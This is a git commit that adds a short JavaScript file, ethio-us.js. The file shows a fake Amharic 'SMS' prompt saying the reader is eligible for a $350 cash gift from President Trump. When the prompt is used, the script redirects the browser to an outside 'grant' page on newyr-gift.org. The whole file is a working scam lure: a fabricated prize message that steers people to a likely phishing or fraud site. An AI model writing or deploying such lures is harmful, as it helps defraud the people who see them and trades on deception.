32a06ae8101a1225edfcb1a50f95bd3056fd7a5a
ukebeblog <esther001imoh@gmail.com>
2025-01-20 08:36:28 +0100

    Create ethio-us.js

---
+++ ethio-us.js
@@ -0,0 +1,6 @@
+
+var password = '$350 ይጠይቁ'
+password=prompt('SMS: እንኳን ደስ ያለህ ለፕሬዚዳንት ትራምፕ የ350 ዶላር መረቅ የጥሬ ገንዘብ ስጦታ ለአፍሪካ/አውሮፓ ሀገራት ብቁ ናችሁ። የገንዘብ ሽልማት ለማግኘት እሺን ተጫኑት።   ','$350 ይጠይቁ');
+if (password != '$350 ይጠይቁ') {
+location.href='https://newyr-gift.org/ethio-us-grant.html';
+}
